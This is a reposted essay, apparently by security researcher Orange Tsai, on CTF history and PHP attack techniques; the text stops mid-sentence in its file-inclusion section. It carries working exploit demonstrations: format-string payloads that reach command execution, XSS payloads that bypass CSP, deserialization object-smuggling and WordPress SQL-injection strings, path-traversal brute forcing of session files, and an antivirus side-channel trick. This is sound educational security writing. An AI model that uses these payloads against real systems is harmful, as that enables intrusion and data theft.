# The Art of PHP – My CTF Journey and Untold Stories!

> 原文: https://www.ctfiot.com/257942.html
> ID: 257942


```
--[ Table of Contents

> Prologue
 - About Me
 - Hacking Competitions
 - Being a Pro CTF Gamer
 - How About PHP Security?

> Main
 1. Reviving Forgotten Bugs Through CTF
 1.1 - Formatting Objects for Fun and Profit!
 1.2 - When Security Features Make You Less Secure

 2. One `unserialize()` to Rule Them All
 2.1 - The "Serialize-Then-Replace" Pattern
 2.2 - Sleepy Cats Catch No Mice
 2.3 - The "Holy Grail" of Deserialization Attacks

 3. When Windows Breaks...
 3.1 - Windows Path Madness
 3.2 - Let's Make Windows Defender Angry!

 4. New Attacks and Techniques Born in CTFs
 4.1 - Twenty Years of Evolving LFI to RCE
 Level 0 - The LFI Arms Race
 Level 1 - The End of LFI
 Level 2 - The End of AFR
 Level Max - Filter Chain ~After Story~
 4.2 - PHAR Deserialization
 Level 0 - What is PHAR?
 Level Max - Laravel (w/ mPDF) Kill Chain

 5. Participants Also Popped 0days
 5.1 - Hack the Scoreboard!
 5.2 - From CTF to Real World!

> Epilogue
 - Honorable Mention
 - Hats off to the CTF Community

> References
```



```
We all play different roles throughout our lives. I was fortunate enough
to discover my passion early - and even luckier to make a living out of
it. Before becoming a full-time hacker, I was also a script kiddie causing
trouble, a young guy thirsty for bigger thrills, and a bug hunter chasing
higher bounties. And now, I can proudly call myself a "hacker." All these
experiences - whether good or bad - have truly shaped who I am today, and
this article shares one chapter of my life - the days when I was competing
full-time in "hacking competitions!"
```



```
Hi, I'm Orange Tsai. I guess many of you probably know me from my
vulnerability research [1]. Maybe you've also heard my name mentioned as a
Pwn2Own champion, a Pwnies Awards winner, or even spotted my bugs on the
KEV (Known Exploited Vulnerabilities) list - like those in Microsoft
Exchange Server, SSL VPNs, and most recently, Apache HTTP Server. I'm not
really sure if this is something I should be proud of, but out of the top
15 bugs hackers exploited most in 2021 [2], around 60% were discovered and
reported by me... (sigh)
```



```
It's been about 18 years since I first came across these so-called
*hacking competitions*. Back then, those competitions - or Wargames, as we
called them - weren't nearly as competitive as today's CTFs. Instead, they
were more about passing down knowledge and, you know, just having fun. So
all sorts of niche topics - whether from computer science, hacking skills,
math, or even hacker culture - could become challenges, as long as geeks
thought they were cool enough!

So even today, after all these years, I still vividly remember those
carefree days when I could simply explore new things. Every day I'd look
forward to learning something new - no matter how useful or useless -
diving deep into subjects just to solve one simple question, and getting
excited about every tiny step forward. Just learn, hack, enjoy - then
repeat!

I still remember those days when I was hooked like it was an online game -
staying up day and night climbing ranks on the leaderboards. At that time,
I'd do anything to solve those challenges - even printing them out and
shamelessly asking my math teacher for help. You know, for someone who
wasn't exactly a typical "good student," that wasn't easy. Anyway, I tried
everything I could think of, but nothing worked, and my ranking stayed
stuck for a long time - until one day, I realized that the answer format
wasn't as strict as I'd thought. That meant I could just skip the hardest
part of the polynomial - and finally got the right answer!

That was the first time - at least as far as I remember - that I felt the
joy of solving problems in a clever way. It was also the first moment I
clearly realized that, just by paying attention to a few more details,
even someone like me could crack problems that the pros called impossible.
This kind of "thinking outside the box" really had a huge impact on my
life afterward!
```



```
I've spent a huge part of my life playing these games, which we now call
"CTF." For those unfamiliar with this term, here's a quick explanation:

 > CTF (Capture the Flag) was originally created by hackers to
 > challenge each other, requiring participants to master various
 > hacking techniques to capture the so-called *flag*.

Ever since DEFCON officially introduced it as part of its event in 1996,
CTF has gradually evolved into a highly competitive *esport*, where
participants typically have 48 to 56 hours, to grind through challenges
set by organizers. Over the years, CTF has also steadily grown into
numerous event series across conferences, universities, and even
nationwide tournaments - ranging from competitions like SECCON in Japan
and XCTF in China, to international competitions like ICC. DEFCON CTF is
especially regarded as the "holy grail" among enthusiasts - something many
hackers dream of experiencing at least once in their lifetime.

I'm fortunate to have experienced the golden age of CTF. Looking back at
my "esports career," I've participated in hundreds of competitions,
especially during those four to five years when I was deeply into CTF. I'd
fly out to different countries almost every two months to attend those
finals, all while grinding through those tough online qualifiers. Though
I've gradually stepped away over the past few years, I still miss those
days - whether it was hacking all night with my teammates in classrooms,
or talking shit and just wandering around new cities between competitions
- these moments remain some of my most precious memories!

Another thing I really love about CTF is its unique community culture. In
fact, a CTF's reputation usually depends directly on the quality of its
challenges. To keep their events awesome year after year, organizers
typically spend months gathering ideas, stuffing their most interesting
techniques, wildest creativity, and proudest exploits into their
challenges. Whether it's reconstructing a half-eaten QRCode pancake [3],
physically hacking a slot machine [4], or giving each team an Xbox and
asking them to battle it out in Doom [5] - these wild ideas fully showcase
the organizers' creativity. Among them, I'd say the most legendary example
has to be "cLEMENCy," introduced by LegitBS during their last year hosting
DEFCON CTF [6]. They created an entirely new, middle-endian CPU
instruction set and even *redefined a byte* as having 9 bits!

=> 9 bits per byte, stored in the middle-endian format!
```



```
+-----Register (bit0 = MSB)-----+
 bit index ---> | b0..b8 | b9..b17 | b18..b26 |
 +---------+----------+-----------+
 | XX | YY | ZZ |
 +---------+----------+-----------+
 |
 | (middle-endian store)
 v
 +---------+----------+-----------+ Memory (addr grows +1)
 | YY | XX | ZZ | <- addr+0, +1, +2
 +---------+----------+-----------+
 b9..b17 b0..b8 b18..b26
```



```
LegitBS released the emulator, debugging tools (and even a hardcover
manual!) just one day before the competition. You can't imagine how
shocked we were at the time! They spent two whole years designing a
brand-new architecture but gave teams just three days to master and craft
shellcode on it. But even now, I still see it as a remarkable feat,
because they successfully shifted the competition's focus back to teams'
genuine skills, rather than those pre-made tools. Of course, this also
turned the finals into a four-day hackathon. (shrug)

Aside from the culture, many brilliant ideas have also come from CTF teams
while solving tough challenges. Techniques like One-Gadget RCE [7] are
classic tricks full of CTF spirit. Others, such as Return-to-CSU [8] and
House of Orange [9], are also fan favorites. Even the "Metagame" outside
the competitions is part of what makes CTF more fun. I've heard of teams
plugging network cables into other teams' routers through social
engineering, exploiting Wireshark bugs to mess with other teams' packet
analysis, using FreeBSD 0days to enable "God Mode" [10], or even
exploiting ELF parser bugs [11] to fool all reversing tools - just like my
teammates did [12]. These are exactly the kinds of creative tricks and
techniques competitions inspire!

I really love this vibe - a group of people, without worrying about
anything, just hacking for fun. So even though CTF is essentially a
competition, it's still somehow a reflection of the internet. I think
these creative sparks between organizers and participants deserve to be
remembered, instead of being lost in time. That's exactly why I want to
take this opportunity - to make sure these incredible stories live on!
```



```
I really love PHP! Especially back in those days, just knowing a little
bit about it was enough to roam freely on the internet - somehow, its
flaws made it feel flawless. Of course I know, doing this so-called
*website hacking* usually got you labeled as a noob - or worse, a script
kiddie. But no matter what, I still really want to write something about
PHP - especially from the perspective of its internals and language
design.

I started getting into PHP around 2010. Back then, Stefan Esser's "The
Month of PHP Security" [13] felt like the only bible to me! Another
webzine I absolutely loved was "PHP Codz Hacking," published by 80vul
[14]. Though I couldn't fully grasp all the details at the time, I still
kept reading whenever there was an update. These were all like spiritual
food during my youth, shaping the younger me!

As the CTF scene rapidly grew around the mid-2010s, it gradually became a
significant contributor to PHP security. Whether it was organizers
crafting ingenious challenges to test hackers worldwide, or teams coming
up with unexpected solutions, all of these efforts have pushed PHP
security forward. Just like I mentioned earlier, though CTF is essentially
a mirror of the internet, sometimes it has real-world impacts, too!

Fast forward to recent years, thanks to CTF, I've had the chance to
witness - and even help create - several new attack techniques. Along the
way, I've also revisited PHP's source code more times than I can count. I
know there must be others who could talk about this better than me, but
anyway, please let me take this special opportunity to fulfill one of my
lifelong dreams!
```



```
Next up, I'd like to talk about the sparks that fly between CTF and PHP!
Whether it's those classic techniques that have inspired generations of
CTF authors, or how the CTF community pushes the security boundary in its
unique way, I'd love to highlight those stories.

Of course, no one can know every story out there. So, if anything's
missing or inaccurately mentioned, I apologize in advance. Also, I'd love
to hear more stories from you - I mean, the more we share these tales, the
longer they'll live on :)
```



```
We always want to stay at the cutting edge, but it's impossible to keep an
eye on every single detail out there. That's exactly why CTF is such a
perfect way to revisit those forgotten bugs.

In fact, to create truly awesome challenges, many CTF authors even become
"bug archaeologists." I mean, figuring out what's really fun seriously
tests how broad our knowledge is and whether you're up-to-date with the
latest techniques. That's why CTF authors usually go treasure hunting
through obscure technical docs, forgotten forums, and even ancient bug
trackers - digging out minor issues, unleashing their creativity, and
breathing new life into them!

Just take the "Corrupting Upload File Indices" bug [15], for example -
it's something I'd completely overlooked for ages. It cleverly exploits
the inconsistent use of `snprintf()` when building array index names,
allowing you to craft data structures that normally require multiple file
uploads - by using just the single-upload mode! It wasn't until I came
across this trick during a quick onsite CTF that I realized I'd totally
missed out on such a cool bug!
```



```
Since this is the first chapter, let me kick things off by sharing
something from my own collection! Ever since the "Arbitrary Object
Instantiation" first appeared in 2015 [16], I've been closely following
this type of attack. Simply put, this attack is all about exploring what
can go wrong when attackers control exactly which object gets instantiated
by the `new` keyword.

From past experiences messing around with Object Injection, we already
know that the available classes in the environment pretty much decide
whether an attack will succeed. Over the years, lots of researchers have
dived into this topic and significantly advanced the exploitation
techniques [17]. But if there aren't any vulnerable classes left in the
environment - does that mean game over? Of course not! If you stop
limiting yourself to "simply instantiating PHP objects," and instead take
things down to a low-level language like C, you might even discover an
entirely new way to break things open!

=> Arbitrary Objects? Choose Your Weapon!
```



```
<?php
 $model = $_GET['model'];
 $object = new $model();
```



```
I think the bug Andrew discovered [18] is an excellent example! This was a
format-string vulnerability that popped up briefly in PHP 7.0.0. When PHP
was making the big jump from 5.6 to 7.0, it introduced a brand-new
`Throwable` interface to better catch errors that the old exception
mechanism couldn't handle. However, while integrating the existing
exception-handling logic into this new interface, the developers
accidentally brought along this vulnerability, too.
```



```
+--------------------------+ +--------------------------+
| Arbitrary Object Inst. | | PHP Bug #71105 |
|--------------------------| |--------------------------|
| <?php | | <?php | +==========+
| $model = $_GET['mod']; | + | $name = "%n%n%n"; | = [ B O O M !]
| $obj = new $model(); | | $name::doSomething(); | +==========+
+--------------------------+ +--------------------------+
```



```
When I first saw Andrew's report, it immediately hit me that this bug
could perfectly combine with the previous attack, creating a fun
combination - something I'd like to call "Format-String Oriented
Programming!"

+--------------------[ One two three - pop that FSB!

=> [1] leak address through PHP errors
```



```
$ curl "http://orange.local/index.php?model=%p-%p-%p"

 Fatal error: Uncaught Error: Class '0x23-0x7fffb61f3df0-0x7f1b12666000'
 not found in [...]
```



```
=> [2] move a heap pointer on stack to `GOT(free)-2`
```



```
$ curl "http://orange.local/index.php?model=AAAAAAAAAAA \
 AAAAAAAA-%p-%p-%p-[...]-%p-%p-%p-%015373273d-%n"

 [...]
```



```
=> [3] partially overwrite `GOT[free]` to call `system()`
```



```
$ curl "http://orange.local/index.php?model='|id&&exit; \
 AAAAAAAA-%p-%p-%p-[...]-%p-%p-%p-%0605504d-%n"

 [...]
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



```
Originally, this was just an idea collecting dust in my notes, waiting for
the perfect moment to turn it into a challenge - but who knew ten years
would fly by like that? Since the perfect timing never came, maybe this is
the right place to write it down - I mean, it's not every day you get to
see a classic format-string bug popping up in a scripting language. That's
PHP for you!
```



```
Ever since @alech and @zeri shocked everyone, demonstrating how you could
take down almost every programming language through algorithmic complexity
[19], PHP had no choice but to introduce the `max_input_vars` directive as
a countermeasure. Although this measure didn't solve the problem from its
root, at least it prevented resource exhaustion from excessive input.
However, using limitations as a defense can sometimes be a double-edged
sword. Just take PCRE's `backtrack_limit` as an example - it was
originally supposed to block ReDoS, but attackers flipped it and used it
to invalidate regular expressions instead. And now, I'd like to introduce
another interesting one - where a security feature actually leads to a
*security bypass*!

In PHP, there's a hidden trap while setting HTTP headers: if there's any
kind of output before response headers, PHP would simply ignore all
subsequent `header()` calls. The official documentation also explicitly
mentions this:

 > Remember that `header()` must be called before any actual output is
 > sent, either by normal HTML tags, blank lines in a file, or from
 > PHP.

This is a textbook issue, and pops up in many CTF challenges. Yet, in most
cases, it still relies on unexpected output caused by existing logical
errors. But what if today, there's no code before setting response headers
at all - can you still exploit it?

---------------------[ CSP: Content Security Policy
```



```
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET["xss"];
```



```
Definitely! @pilvar cleverly exploited a side effect on `max_input_vars`
[20] : when the number of parameters exceeds PHP's limit, PHP kindly
throws a warning message at you. However, this warning indeed violates the
assumption that "there must be no output before the response header,"
totally breaking the defense-in-depth CSP, and re-enabling Cross-Site
Scripting again!

+---------------------[ CSP? Can't Stop Payloads!

=> [1] CSP says No!
```



```
$ curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"
 HTTP/1.1 200 OK
 [...]
 Content-Security-Policy: default-src 'none';

 <svg/onload=alert(1)>
```



```
=> [2] We're free from CSP now!
```



```
$ curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&A=3&A=4&...&A=999&A=1000"
 HTTP/1.1 200 OK
 [...]

 <b>Warning</b>: PHP Request Startup: Input variables exceeded 1000 [...]
 <br />
 <b>Warning</b>: Cannot modify header information - headers already sent

 <svg/onload=alert(1)>
```



```
Honestly, I really love this kind of story - where security features end
up making you less secure! And... Speaking of fixes for complexity attacks
- there was one time when a patch accidentally upgraded the simple DoS
issue into full-blown remote code execution. But that's a whole other fun
story [21]!
```



```
The entire Infosec community realized early on: once attackers control the
`unserialize()` input, they can prefill an object and reuse dangerous
Magic Methods to launch various attacks. However, as people gradually
became aware of the danger of deserialization, developers no longer
trusted user-supplied inputs. This shift pushed security researchers to
start digging deeper into the underlying behavior of applications.
WordPress, for example, stores strings, arrays, and even objects in the
database without caring about their data types - which turns out to be a
particularly interesting feature.

In WordPress, whenever a string fetched from the database "looks
serialized," WordPress attempts to restore it automatically. So whether
you're leveraging an asymmetric serialization interface [22], or bringing
back the classic Column Truncation Attack [23] with a Pile of Poo Emoji
(U+1F4A9) [24], you can easily trigger a deserialization bug in WordPress!

-----------------[ WordPress Unserialize ALL the Things!
```



```
<?PHP
function maybe_unserialize( $original ) {
 if ( is_serialized( $original ) ) // Looks serialized? Let's wake it up!
 return @unserialize( $original );
 return $original;
}

function is_serialized( $data, $strict = true ) {

 // [...] validate serialized string formats

 $token = $data[0];
 switch ( $token ) {
 // [...] `O` stands for `Object`
 case 'O' :
 return (bool) preg_match( "/^{$token}:[0-9]+:/s", $data );
 case 'b' :
 case 'i' :
 case 'd' :
 $end = $strict ? '$' : '';
 return (bool) preg_match( "/^{$token}:[0-9.E-]+;$end/", $data );
 }
 return false;
}
```



```
As far as I remember, the first time I saw this pattern was back in 0CTF
2016 [25]. The pattern leverages an extra step that applications perform
on serialized strings - breaking the serialization format, causing the
embedded string to escape from its intended context, and ultimately get
interpreted as an entirely new - and malicious - object!

+--------------------[ Serialize, Replace, Then Pwn!

=> [1] crafting the payload...
```



```
<?PHP
php > $user = 'orange';
php > $pass = ';s:8:"password";O:4:"Evil":0:{}s:8:"realname";s:5:"pwned';
php > $name = 'Orange Tsai' . str_repeat('..', 25);
php > $obj = new User($user, $pass, $name);
php > $data = serialize($obj);
```



```
=> [2] developers attempt to block path traversal :)
```



```
php > $data = str_replace("..", "", $data);
```



```
=> [3] the length of `realname` field has been corrupted ;)
```



```
<?PHP
php > print_r($data);
 O:4:"User":3:{
 s:8:"realname";s:61:"Orange Tsai";s:8:"username";[...]
 ^^ <--- corrupted length: [61 bytes]
 |---------------------------------|
 |"Orange Tsai";s:8:"username";s:6:|
 |"orange";s:8:"password";s:56:" |
 |---------------------------------|
 ;s:8:"password";O:4:"Evil":0:{}
 s:8:"realname";s:5:"pwned";
 }
```



```
=> [4] We have smuggled our own *Evil* object!
```



```
<?PHP
php > print_r(unserialize($data));
 User Object (
 [realname] => pwned
 [password] => Evil Object ()
 )
```



```
When it comes to classic examples of this pattern, we definitely can't
skip the unexpected side effect WordPress introduced when it tried to
harden its core class against the infamous "Double Preparing" problem
[26].

Basically, Double Preparing is simply a bad developer practice. It stems
from the mistaken assumption that anything returned by one
`$wpdb->prepare()` is inherently safe, so passing it to another
`prepare()` is also safe. Though WordPress does help block dangerous
characters from causing SQL injection, it can't really stop developers
from misusing format strings like `%s`. This bad practice ultimately
breaks the whole prepared statement, reviving SQL Injection once again!

----------------------[ Prepare Twice, Inject Once!
```



```
<?PHP
php > $value = "%1$%s OR 1=1--#";
php > $clause = $wpdb->prepare(" AND value = %s", $value);
php > $query = $wpdb->prepare(
 "SELECT col FROM table WHERE key = %s $clause", $key);
php > $wpdb->get_row($query);
 // SELECT col FROM table WHERE key='****' AND value = '****' OR 1=1--#'
```



```
And to keep developers from stepping on this landmine, WordPress
introduced a workaround - it temporarily replaces all formatting
characters processed by `$wpdb->prepare()` with special placeholders, and
only restores them right before executing the query. This effectively
prevents developers from introducing unexpected formatting characters
while constructing SQL queries. However, WordPress overlooked one special
case - the query itself might also contain placeholders!

=> The WordPress Way: Hiding every single `%`!
```



```
<?PHP
public function prepare( $query, $args ) {

 /* [...] formatting the $query with $args */

 // [!!!] replace `%` with a *random* placeholder.
 return str_replace( '%', $this->placeholder_escape(), $query );
}
```



```
So when this mechanism is combined with the serialization process we
mentioned earlier, developers could unintentionally create a "serialized
string containing placeholders." This causes WordPress to mistakenly
restore extra placeholders, storing serialized data with mismatched
lengths in the database. Then, the next time WordPress fetches that data,
it gets parsed incorrectly - turning a previously legitimate string into a
malicious object.

Since this behavior is considered just an unintended side effect, the
issue still exists even in the latest version of WordPress. For plugin
developers relying on the WordPress ecosystem, the best they can do is try
to avoid stepping on this hidden landmine as much as possible - or they'll
end up like WooCommerce, becoming yet another victim of deserialization
vulnerabilities [27].

This "serialize-then-replace" pattern does also appear in Joomla! [28]. To
handle user states, Joomla! manages all SESSION operations by itself. But
since PHP serialization can produce strings containing NULL bytes, Joomla!
also replaces these NULL bytes with special placeholders - giving
attackers another chance to break the serialization format. I'm guessing
this particular issue was probably the original inspiration behind that
0CTF challenge we mentioned earlier!
```



```
If we're really going to talk about deserialization problems from a
defender's perspective, aside from minimizing entry points to
`unserialize()`, it's even more important to strengthen commonly used
libraries. That way, even if attackers manage to find vulnerabilities
within applications, they'll struggle to actually exploit them due to the
lack of usable POP chains - ultimately making the entire PHP ecosystem
much safer!

However, building these defenses was not easy at all. At first, developers
relied on simple regular expressions, but the whole situation quickly
turned into a classic cat-and-mouse game due to PHP's overly loose
serialization parser. Developers soon moved their checks to the
`__wakeup()` method, hoping to build a more robust defense right at the
very start of the deserialization process. But surprisingly, under certain
conditions, PHP itself "could silently skip calling the `__wakeup()`
method" [29]! This unexpected behavior completely broke every defense
relying on it - eventually leading to a remote code execution
vulnerability in SugarCRM!

=> How SugarCRM attempted to protect against deserialization attacks
```



```
<?PHP
public function __wakeup() {
 // clean all properties
 foreach(get_object_vars($this) as $k => $v) {
 $this->$k = null;
 }
 throw new Exception("Not a serializable object");
}
```



```
Around 2017, we also started seeing various CTF challenges that aimed to
bypass the `__wakeup()` method. However, most were still based on
scenarios where different objects shared the same context - participants
had to trigger garbage collection before one object's `__wakeup()` checks,
then reuse dangerous code inside another object's `__destruct()`. What
really caught my eye was the clever "Reference Trick" [30] used by Paul
Axe at WCTF 2019: by pointing dangerous properties elsewhere, he neatly
bypassed the property-cleanup operations in `__wakeup()`. The same idea
was later adopted into Laravel's POP chains [31], becoming yet another
classic deserialization!
```



```
We've talked about plenty of deserialization issues so far, but how much
damage they can actually cause still depends heavily on whether the
application has any vulnerable classes or not. Of course, projects like
PHPGGC [32] have been continuously documenting and polishing generic POP
chains, but how to pull off deserialization attacks without any existing
application code still remains the holy grail for deserialization hackers.

It's true that in the early days, hackers experimented with neat tricks -
like using `SoapClient` to pull off XXE or SSRF [33] - but that was still
quite far from achieving real RCE. Since then, app-level exploitation
seemed to have hit a bottleneck, and lower-level approaches - especially
those focusing on memory corruption - quickly became hot topics.

When it comes to the legendary memory corruption cases in PHP
deserialization, most people might probably think of the amazing work by
@cutz (and others) on PornHub [34]. But, I bet we all first learned how to
craft fake `zval` structures from Stefan Esser's research [35] - going
step-by-step from arbitrary reads, arbitrary writes, all the way to fully
controlling the Program Counter!

And while we're on this topic, there's another name we absolutely can't
miss: Taoguang Chen (aka. Ryat). He began reporting tons of bugs directly
inside the serialization parser starting around 2015, sparking a new wave
of low-level research on deserialization issues. Even PHP's core
developers also publicly acknowledged that "deserialization had become the
largest source of security bug reports" for them!

I've also personally benefited multiple times from bugs reported by @Ryat
(thanks!). During one of my red team operations, I started from a Type
Juggling 0day, turned that into a Use-After-Free [36] on a completely
unknown and remote environment, and then spent several weeks grinding
through it before finally achieving full RCE. Honestly, it's still one of
my proudest hacks to this day, and I even turned the whole process into a
CTF challenge afterward - if you're interested in the full chain, feel
free to check it out right here [37]!

With the official PHP team announcing "they wouldn't treat `unserialize()`
as a security boundary anymore," it seemed like the whole deserialization
journey was coming to an end. But just as everyone thought the era of
deserialization attacks was about to close, another new chapter was
already taking shape - ready to shock the entire Infosec the very next
year. We'll dive into this brand-new technique shortly in the upcoming
section, "New Attacks and Techniques Born in CTFs".

 [ -- Spoiler Alert: it's our all-time friend, LFI... and more! ;) ]
```



```
One thing I really love about Web Security is that, even though each
individual trick seems pretty simple, the real challenge lies in figuring
out how to chain them together. Especially nowadays, behind every
seemingly simple website, there's usually a complex mix of tech stacks,
layered architectures, and cross-system interactions - not to mention that
each component has its own quirks and technical debt. So what makes Web
Security fascinating - and frankly beautiful - to me is finding a tiny
flaw, figuring out how to leverage the architecture to amplify its impact,
and chaining everything together into a clean, well-crafted exploit to
take over the entire system!

Personally, I'm a huge fan of the security issues caused by interactions
across applications. Whether it's about HTTPoxy [38] - caused by naming
collisions defined in RFC specs - TLS Poison attacks [39] that abuse
TLS/SSL session resumption, or an old-school trick from the '90s
resurfacing in modern frameworks [40] like Laravel, these are all
legendary in my book!

But let's put those aside for now - and start with everyone's favorite
classic: Windows!
```



```
If we're really talking about the most notorious issue when running PHP on
Windows, I'd say it's definitely how Windows handles file paths! My
earliest memories of this topic probably come from the classic articles by
the teams at USH.it [41] and ONsec [42]. They documented tons of quirky
behaviors in how Windows processes file paths, allowing you to access
files in all kinds of fancy ways.

These tricks were so well-known in the early days that you'd see them in
basically every CTF. Probably the most memorable combo was using
"wildcards in DOS Devices" to brute-force randomized filenames
character-by-character. This technique quickly made its way into several
popular web applications, including PHPCMS [43] and DedeCMS [44] as two
notable examples. Attackers can use this trick to reveal sensitive paths -
like backup files, session names, and even the admin portal - by simply
checking whether certain paths exist or not!

--------------------[ Brute-forcing the SESSION Path
```



```
Base URL: http://phpcms/api.php?op=creatimg&txt=1337&font=*PATH*
 |
 v
 +-----------------------+
 | Current prefix = "" |<------------+
 +-----------+-----------+ |
 | |
 +-----------v-----------+ |
 +------------> | Try next character: C | |
 | +-----------+-----------+ |
 | | |
 | v |
 | +----------+----------+ |
 | | | |
 | +-----+-----+ +-----+----+ |
 | | No image | | Image OK | |
 | +-----+-----+ +-----+----+ |
 | | | |
 | v v (prefix += C) |
 +--------------+ +---------------+

$ curl "${URL}&font=../../../../../../../../xampp/tmp/sess_A<" # [--]
$ curl "${URL}&font=../../../../../../../../xampp/tmp/sess_B<" # [--]
$ curl "${URL}&font=../../../../../../../../xampp/tmp/sess_C<" # [OK]
$ curl "${URL}&font=../../../../../../../../xampp/tmp/sess_CA<" # [--]
$ curl "${URL}&font=../../../../../../../../xampp/tmp/sess_CB<" # [OK]

 [...]

$ curl "${URL}&font=[...]/tmp/sess_CBHRVOFTMP41BIOV02VPSGSUP7" # [OK]
```



```
Also, Alternate Data Streams (ADS) on NTFS is another feature hackers love
to abuse. A classic trick is using a special stream to turn "arbitrary
file writes" into "arbitrary directory creation" [45]. One particularly
memorable combo is leveraging this trick to create the missing
`@@plugin_dir` directory, thereby reviving the MySQL UDF attack chain!

---------------------[ Revive the MySQL UDF Attack!
```



```
C:\Users\Orange> ver
 Microsoft Windows [Version 10.0.19042.631]

C:\MySQL\lib> dir plugin
 File Not Found

C:\MySQL\lib> mysql -uroot -e
 mysql> SELECT 1 INTO OUTFILE 'C:\\MySQL\\lib\\plugin::$INDEX_ALLOCATION'
 ERROR 3 (HY000): Error writing file [...] (Errcode: 22)

C:\MySQL\lib> dir plugin
 04/21/2025 06:21 PM <DIR> .
 04/21/2025 06:21 PM <DIR> ..
```



```
Given that most of these quirky behaviors come from Microsoft's attempts
to maintain backward compatibility, websites running on Windows
essentially start in hard mode. Even WorstFit Attack [46] that @splitline
and I published last year stemmed from the technical debt that Windows has
carried for over twenty years - all just to support legacy ANSI encoding -
but we'll dive deeper into that later!
```



```
Although we've talked plenty about Windows' weird behaviors, I guess if
you choose Microsoft, you'll just have to live with it. However, what's
even more surprising is that sometimes even Windows' built-in antivirus
can sneak up and hit you with a sucker punch! And that's exactly what
happened with AVOracle - an ingenious new technique from @icchy that can
turn literally any scan result into a side-channel oracle!

This technique first showed up in a challenge called "Gyotaku The Flag"
[47] at WCTF 2019. Since this is the second time we're mentioning WCTF, I
think it's worth giving a bit more context here. Unlike traditional CTFs,
WCTF uses a special "Belluminar" format [48]. The organizer invited the
world's top 10 CTF teams, asked each team to create two challenges, and
had them compete by solving each other's problems. And just like the name
"Belluminar" suggests - besides "Bellum" (Latin for "war"), the more
important part was the "Seminar" afterward. Each team had to give a
detailed presentation explaining their challenge design, which was then
evaluated by judges and other teams.

Since WCTF offered the largest prize pool at the time, figuring out "how
to design a good challenge" naturally became the key to winning the
competition. Designing a challenge that's fair - but not frustrating - and
still fun enough to impress the world's top CTF players (including
industry experts, pro hackers, and even multiple-time Pwn2Own champions)
is way harder than it sounds. But that's exactly why so many
groundbreaking hacking techniques made their debut at WCTF. For instance,
the ever-popular "Semicolon Trick" [49] actually originated from a
challenge I made for WCTF 2016, and was only later officially unveiled at
Black Hat USA 2018!

Although @icchy made a small slip-up while designing the challenge, it
didn't take anything away from its novelty. Later that same year, he
brought the technique back using PHP at TokyoWesterns CTF - proving that
AVOracle wasn't just an edge case; instead, it was indeed a new attack
that could adapt to different scenarios!

=> Here's what @icchy shared about how many teams solved his WCTF challs
---------------------------------------------------------------------------
 - 2017: 7dcs (Crypto, Web, Reverse, Pwn) -> 0 solved
 - 2018: f (Forensics, Reverse, Web) -> 1 solved
 - 2019: Gyotaku The Flag (Web, Misc) -> **everyone solved**

The entire AVOracle stems from how Windows Defender scans for malware - it
automatically emulates anything that "looks like JavaScript." Especially
since Defender evaluates the file as a whole, if a file includes both
"attacker-controlled" and "unknown" parts, the attacker can leverage the
controlled part to influence how Defender perceives the unknown section.
What's worse, if Defender flags the file as malicious, it'll automatically
delete it - letting attackers turn this file deletion into a side-channel
oracle to reveal the file content!

=> Let's pretend the following file is a valid EICAR so we don't make
 Windows Defender *angry*! ;)

=> [1] Defender detects the EICAR string
```



```
$ cat eicar.com
 EICAR-STANDARD-ANTIVIRUS-TEST-FILE!

$ ./mpclient eicar.com
 [...]
 EngineScanCallback(): Threat Virus:DOS/EICAR_Test_File identified.
```



```
=> [2] Defender kindly *emulates* your file as JScript
```



```
$ cat sample.txt
 var mal = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE"
 eval(mal + "!")

$ ./mpclient sample.txt
 [...]
 EngineScanCallback(): Threat Virus:DOS/EICAR_Test_File identified.
```



```
So, let's say you can store a secret in the SESSION file, but there's no
way to read it directly. Crafting the following structure gives you the
ability to check whether the first character of the secret is an `A`: if
it is, the file gets deleted; otherwise, it stays. I think this technique
is super creative - and in some ways, it's a perfect example of how CTF
helps push the boundaries of cybersecurity!

=> Defender *emulates* the JavaScript inside
```



```
+--------------------------------------------------------------+
| Crafted HTML File |
|--------------------------------------------------------------|
| [ Arbitrary Padding / Junk Data ] |
| |
| +----------------------------------------------------------+ |
| | <script> | |
| | var c = document.body.innerHTML[0] == 'A' ? '!' : 0; | |
| | eval("EICAR-STANDARD-ANTIVIRUS-TEST-FILE" + c) | |
| | </script> | |
| +----------------------------------------------------------+ |
| |
| +----------------------------------------------------------+ |
| | <body> | |
| | [ Leaked Secret / Sensitive Data ] | |
| | </body> | |
| +----------------------------------------------------------+ |
| |
+--------------------------------------------------------------+
```



```
We've already talked about tons of PHP-related tricks, but honestly, most
of them didn't originally come from CTFs. On the other hand, we've
introduced brand-new attacks born in CTFs - but again, they weren't
exactly PHP-specific. So, are there any new attacks out there that are
both totally PHP-specific and originated from CTFs?

I think this chapter perfectly captures where these two worlds intersect.
Let's see how the CTF community pushes technology forward in a unique way,
breathing new life into the following attack surfaces!
```



```
"How can a simple LFI be turned into RCE?" This question has bothered the
web security community for almost twenty years, and I think we'd all agree
- solving this long-standing problem is probably one of CTF's greatest
contributions to PHP security!

--------------------------[ LFI Never Gets Old
```



```
<?php
 include( $_GET['page'] );
```



```
Looking back at the twenty-year journey from LFI to RCE, I think we can
generally divide it into two approaches:

 1. How to find more universal and attacker-controllable files on the
 server.
 2. How to bypass restrictions using built-in URL Protocols and
 Wrappers.

Since the success of an attack directly depends on what files exist on the
target system, early LFI research focused heavily on finding better ways
to control file contents - like poisoning server logs through HTTP
requests or leveraging environment variables exposed by `procfs`. Among
all these tricks, the most classic one has to be abusing PHP's file upload
mechanism.

When PHP processes the upload requests, it would temporarily store the
content on the filesystem. Even though this timing window is extremely
short, figuring out how to exploit LFI within such a tiny window became
quite a hot topic for early hackers. A bunch of classic tricks emerged
from this challenge, such as:

 - [ PHP LFI to RCE via RFC1867 ] - [50]
 => @gynvael combined the previously mentioned DOS wildcard tricks,
 showing how to turn "LFI on Windows" into RCE.

 - [ LFI with PHPINFO() Assistance ] - [51]
 => Brett Moore leveraged the fact that `phpinfo()` prints temporary
 filenames. By significantly increasing the server's load, he
 managed to include the file before it got deleted, proving how
 "LFI with PHPINFO" can lead to RCE.

As for the second approach, since exploiting LFI in real-world scenarios
often comes with additional restrictions - such as a fixed `.php` file
extension - though early hackers could still bypass these with overly long
paths or NULL-byte truncation, PHP gradually patched these tricks, forcing
